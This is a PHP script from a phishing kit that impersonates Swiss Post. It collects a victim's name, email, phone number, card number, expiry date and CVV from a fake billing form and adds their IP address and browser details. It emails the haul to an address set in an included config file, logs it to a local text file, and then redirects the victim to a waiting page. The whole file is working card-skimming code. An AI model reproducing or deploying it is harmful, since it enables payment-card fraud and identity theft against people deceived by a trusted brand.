<?php
require_once('04-amassuo.php');
$IP = getenv("REMOTE_ADDR");
$message = "--++-----[💛💙 RESULT-CC 💛💙 ]-----++--\n";
$message .= "-------------- 04-amassuo -----\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "email : ".$_POST['email']."\n";
$message .= "phone : ".$_POST['phone']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- 04-amassuo ----------------------\n";
$sender = "CVV Switzerland Post";
$subject = "billingg Switzerland Post [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
_mail($email,$subject,$message);
    $text = fopen('../mlafta.txt', 'a');
fwrite($text, $message);



header("Location: ../wait/index.php");
?>
